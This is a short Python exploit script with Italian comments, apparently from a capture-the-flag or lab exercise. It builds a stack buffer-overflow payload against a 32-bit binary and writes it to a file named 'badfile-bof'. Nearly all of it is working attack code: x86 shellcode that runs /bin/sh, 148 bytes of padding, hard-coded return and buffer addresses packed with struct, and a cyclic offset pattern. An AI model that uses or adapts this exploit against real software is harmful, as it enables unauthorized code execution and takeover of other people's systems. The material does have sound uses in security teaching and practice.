import os
import struct

#shell di sistema

shellcode = (b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")

string = 0x0804a060
vuln = 0x804849b

payload = "A\n"

payload1 = "a"*148
payload1 += struct.pack("I", string)

#payload1

payload1 += "AAA%AAsA" #pattern di 8 per andare nel ret

payload1 += struct.pack("I", vuln)

#per arrivare al ret address
payload1 += "B"*4

padding = 0x0804a060 + len(payload1) + 4 #4 per il ret address
payload1 += struct.pack("I", padding)
payload1 += shellcode

#AA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"

payload += payload1

f = open("badfile-bof", "w")
f.write("%s" % payload)
f.close()
